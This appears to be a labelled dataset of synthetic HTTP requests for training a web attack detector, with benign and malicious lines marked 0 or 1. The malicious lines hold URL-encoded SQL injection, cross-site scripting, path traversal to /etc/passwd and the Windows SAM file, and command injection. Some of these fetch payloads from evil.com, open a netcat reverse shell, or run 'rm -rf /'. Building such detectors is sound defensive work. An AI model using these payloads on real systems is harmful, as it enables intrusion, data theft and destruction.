GET /dashboard?view=system+log+entry&product_id=492&color=please+find+attached&old_password=494 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /dashboard?age=test%20%24%28cat%20/etc/shadow%29%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /products/123?new_password=hello%20....//....//....//etc/passwd%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/users lang=123%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20St&region=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?tag=contact%20%3Csvg/onload%3Dalert%281%29%3E%20St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile price_max=best+regards&last_name=admin+access+request&password=%7Cc%27a%27t%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?password=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/v2/analytics title=my+address+is&format=123+Main+St&email=480&filters=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /js/app.js?type=please+find+attached&date=614&title=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /login?page=please+find+attached&region=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&password=976 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /posts/789?name=hello+world&columns=484&comment=best+regards&username=764&action=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /help/faq columns=please%20admin%27%20OR%20%271%27%3D%271%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/search?title=580 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /products/123?status=70&lang=admin%20%27%20OR%20%271%27%3D%271%27--%20you&q=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/v1/data?search=this%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20email%40example.com&author=hello+world&phone=952 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /users/456 user_id=671&comment=764&color=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /settings?product_id=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /dashboard columns=test+user&comment=%27%20OR%20%271%27%3D%271%27--&user_id=test+user&password=I+would+like+to+order&last_name=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /login?phone=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /register?old_password=578&order_id=contact%20%7C%20curl%20http%3A//evil.com/backdoor%20is&columns=44 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /about tag=925&quantity=123+Main+St&content=394 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /images/logo.png?id=916 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/v1/data title=this+is+a+normal+comment&sort=test+user&old_password=my+address+is&id=947&new_password=986 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /docs/api q=%7Cc%27a%27t%20/etc/passwd&filter=123+Main+St&phone=847 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /login?new_password=387&order=%3B%20rm%20-rf%20/&filters=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/v2/analytics?status=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&order_id=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/search?tags=65&format=I%20file%3A///etc/passwd%20request&city=please+find+attached&price_max=thank+you&user_id=920 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/reports tags=test%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20is&search_term=503&age=810 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /settings?region=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&username=this+is+a+normal+comment&tags=806&filter=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /settings order=admin%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20regards&price_max=contact+me+at+email@example.com&category=123+Main+St&title=634 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/orders?old_password=John+Doe&region=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?view=this%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20St&lang=846&search=614&date=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?category=376&filters=my+address+is&page=admin+access+request&region=372 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /users/456?new_password=thank%20%3Csvg%20onload%3Dalert%281%29%3E%20entry&first_name=test+user&search_term=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/users?first_name=this%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /contact?tags=John+Doe&view=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /images/logo.png?type=hello+world&view=system+log+entry&sort=383&password=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /contact?color=contact+me+at+email@example.com&old_password=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /dashboard?password=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /login?order_id=best+regards&id=444&comment=my+address+is&filter=226&password=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /docs/api name=please%20%27%3B%20DROP%20TABLE%20users--%20user&date=898&rating=807&price_min=598&city=242 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /settings rating=contact+me+at+email@example.com&phone=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&search_term=763 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/products?type=638&sort=system%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20St&username=admin+access+request&author=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /users/456 user_id=thank+you&quantity=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&filters=500&username=admin+access+request&limit=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /contact?password=123%20%60id%60%20St&author=796 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/reports last_name=963 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /js/app.js?first_name=225&token=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /users/456 tracking=test+user&filters=%27%20OR%201%3D1--&format=159&filter=331 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v1/data session=705&quantity=best%20%7Cc%27a%27t%20/etc/passwd%20regards&tags=please+find+attached&token=284&q=33 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?name=975&limit=920&columns=my+address+is&filters=John%20%27%3B%20SELECT%20pg_sleep%285%29--%20is&email=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v2/analytics old_password=thank+you&date=please%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20attached&new_password=140&content=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/v2/analytics filter=this+is+a+normal+comment&price_min=845 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?filters=632&tag=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /register?comment=/var/www/../../etc/passwd&page=test+user&title=please+find+attached&new_password=283 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api name=519&filter=hello+world&first_name=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/orders?lang=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /images/logo.png?filters=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&order=474&filter=contact+me+at+email@example.com&email=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /products/123?status=please%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20you&age=325 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /docs/api?username=please+find+attached&city=725&age=434 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/orders?username=954&comment=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&new_password=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /login?tag=system+log+entry&category=thank%20%3Csvg/onload%3Dalert%281%29%3E%20request&new_password=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /js/app.js view=867&token=my+address+is&filters=980&price_max=my+address+is&search=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?tracking=file%3A///etc/passwd&date=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /about?city=test+user&email=contact+me+at+email@example.com&tag=26&limit=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&status=387 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /contact page=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /login?content=thank%20%3B%20ls%20-la%20attached&status=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?limit=system+log+entry&first_name=....//....//....//etc/passwd&status=234&rating=548&tags=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/reports name=system%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20email%40example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /posts/789 email=919&rating=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /css/style.css?age=thank+you&comment=I%20%27%3B%20SELECT%20pg_sleep%285%29--%20is&color=404&rating=49 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/orders?type=please+find+attached&lang=149&rating=693&sort=thank%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20entry&price_max=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /profile?action=%27%20AND%201%3D2--&search=302&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings price_max=123%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20user&search=587 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /js/app.js?search=%3Csvg/onload%3Dalert%281%29%3E&order=388&format=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /posts/789 last_name=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /profile?author=107&action=my+address+is&product_id=test+user&email=373 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about tag=thank+you&region=system+log+entry&action=John+Doe&status=%3Csvg%20onload%3Dalert%281%29%3E&new_password=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /posts/789?age=349&price_max=991&status=hello+world&last_name=I+would+like+to+order&title=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?age=please+find+attached&color=John+Doe&rating=test+user&lang=211&title=123%20%27%20AND%201%3D1--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/v2/analytics?limit=411&rating=694&tag=132&title=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?lang=865&email=contact%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20attached&comment=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/orders?lang=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&page=36&comment=591 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /login?title=859&price_min=307&region=I%20%3B%20rm%20-rf%20/%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /settings view=system+log+entry&category=682&last_name=461&name=admin+access+request&filter=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/v1/data username=best%20%27%20OR%20%271%27%3D%271%27--%20Doe&comment=contact+me+at+email@example.com&age=339 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /docs/api?session=188&comment=admin+access+request&age=please+find+attached&color=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/v2/analytics tracking=941 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /help/faq?lang=admin%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/v2/analytics search_term=admin%27%23 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?tags=file%3A///etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/search?last_name=I%20%3B%20wget%20http%3A//evil.com/shell.sh%20world&phone=please+find+attached&first_name=963 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?color=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/reports region=284&status=my+address+is&limit=42 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /docs/api price_min=475&token=../../../etc/passwd&old_password=868&sort=hello+world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /about first_name=John+Doe&author=258&password=admin+access+request&phone=I+would+like+to+order&quantity=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /js/app.js?tags=987&first_name=%60id%60&page=my+address+is&session=28 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/reports?tags=this+is+a+normal+comment&age=937&old_password=983&first_name=I%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/users?price_max=test+user&new_password=best+regards&password=thank+you&tracking=503&filter=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /api/products lang=admin%20%27%3B%20DROP%20TABLE%20users--%20order&phone=935&password=712 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?new_password=hello+world&last_name=11 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /help/faq color=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/search?category=804&city=John%20%3Csvg/onload%3Dalert%281%29%3E%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /css/style.css tags=system%20%27%20AND%20%27x%27%3D%27x%20email%40example.com&limit=this+is+a+normal+comment&author=796&sort=123+Main+St&lang=646 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /images/logo.png page=123%20%3Csvg/onload%3Dalert%281%29%3E%20Doe&search_term=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /docs/api status=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&session=hello+world&sort=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?type=contact+me+at+email@example.com&status=%27%3B%20SELECT%20pg_sleep%285%29--&name=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /images/logo.png age=123%20%27%20OR%20%271%27%3D%271%27--%20St&password=760 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?category=best+regards&new_password=I+would+like+to+order&color=admin+access+request&age=best%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/v2/analytics?price_min=906&q=123+Main+St&search=534&sort=thank+you&action=contact%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /register tag=hello+world&lang=please+find+attached&product_id=best+regards&price_min=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /users/456 status=107&title=my+address+is&columns=my%20....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/v1/data?tag=hello+world&action=475&old_password=120 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?tracking=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--&name=290&last_name=285&order=939 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /contact last_name=850&author=best+regards&limit=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/v1/data?filters=308&username=123%20%27%20AND%20%27x%27%3D%27x%20St&tag=663 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/orders?email=my+address+is&quantity=I+would+like+to+order&user_id=997&first_name=best+regards&phone=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /docs/api?id=927&type=918 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/v1/data?view=175&limit=my%20....//....//....//etc/passwd%20order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /css/style.css?price_max=I%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /dashboard?limit=95&price_min=system+log+entry&category=I+would+like+to+order&password=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /profile status=my+address+is&action=831 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /contact?order=951 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /help/faq?action=this%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20comment&last_name=748&search_term=system+log+entry&price_min=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/orders?view=123%20%60id%60%20email%40example.com&status=my+address+is&filters=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /dashboard age=541&view=John+Doe&tag=this+is+a+normal+comment&content=717 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products old_password=best+regards&email=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&type=716&status=212 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /docs/api limit=test+user&tag=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&format=my+address+is&type=873&name=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /images/logo.png?password=%3B%20wget%20http%3A//evil.com/shell.sh&action=contact+me+at+email@example.com&token=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /images/logo.png?id=test+user&filter=thank%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /profile?content=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/products?city=896&format=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/users?quantity=thank+you&color=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&session=256&comment=hello+world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /register rating=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /posts/789 q=../../../etc/passwd&author=42&id=522&username=contact+me+at+email@example.com&title=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/orders?sort=contact+me+at+email@example.com&date=573&tracking=707&title=935 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/search password=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /posts/789?comment=thank+you&id=system%20%27%20AND%201%3D2--%20you&title=I+would+like+to+order&lang=924 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v1/data?price_min=87 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /images/logo.png product_id=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/search?product_id=admin%27%23&quantity=please+find+attached&tags=456&last_name=66&tracking=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /login page=254&format=659&price_min=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /contact?date=thank+you&action=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /api/products?limit=I+would+like+to+order&name=best+regards&color=admin+access+request&filters=345 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /js/app.js old_password=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&date=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register limit=I%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /help/faq?rating=300&price_min=356&q=admin%27%23&password=123+Main+St&name=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?q=this+is+a+normal+comment&price_max=642&email=please%20%27%3B%20SELECT%20pg_sleep%285%29--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /api/reports?search=system+log+entry&username=85&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /help/faq?age=881 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /api/reports?first_name=83&comment=123+Main+St&old_password=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /dashboard?password=test+user&title=561&q=123+Main+St&search_term=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/orders id=745&token=485&password=882 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /contact order_id=my%20..%25252f..%25252f..%25252fetc%25252fpasswd%20regards&password=353&action=my+address+is&username=321&category=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /register id=admin%27/%2A&email=admin+access+request&phone=632&new_password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /register?last_name=test+user&tracking=John+Doe&columns=please+find+attached&color=648 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /register format=test+user&region=my+address+is&id=admin%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20request&last_name=499 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users q=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/users?last_name=my+address+is&search=I+would+like+to+order&order=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&page=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
